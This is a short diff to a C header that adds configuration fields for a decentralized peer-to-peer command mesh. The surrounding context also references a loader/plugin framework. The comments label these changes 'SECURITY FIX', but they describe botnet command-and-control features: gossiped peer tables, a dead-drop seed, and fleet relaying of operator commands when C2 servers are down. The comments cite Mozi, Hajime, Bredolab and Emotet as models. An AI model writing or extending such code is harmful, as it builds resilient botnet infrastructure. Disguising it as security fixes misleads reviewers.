@@ -178,6 +178,22 @@ typedef struct {
     uint16_t relay_port;
     char relay_token[64];
 
+    /* SECURITY FIX (#139): Decentralized P2P command/peer mesh. A bounded
+     * peer table (addr:port + last-seen) is gossiped over relay sockets
+     * and seeded from the dead-drop blob's `peers=` field; the mesh
+     * listener accepts ed25519-signed MESH frames (verified against the
+     * operator pubkey baked at build time, fail-closed). When all C2
+     * endpoints are down the fleet still relays operator commands — the
+     * Mozi/Hajime design property. Off by default; requires a
+     * relay_token (shared fleet token, used to authenticate MESH frames)
+     * and an operator pubkey. mesh_static_peers[] is the optional
+     * bootstrap list. Configured via mesh_enabled= / mesh_port= /
+     * mesh_operator_pubkey= / mesh_static_peers_1..N= . */
+    uint8_t mesh_enabled;
+    uint16_t mesh_port;
+    char mesh_operator_pubkey[65];        /* 64 hex + NUL */
+    char mesh_static_peers[MESH_PEER_MAX][256];
+
     /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
      * split). When 1 (default) the built-in plugin registry is
      * bootstrapped at start and the `plugin` C2 command dispatches
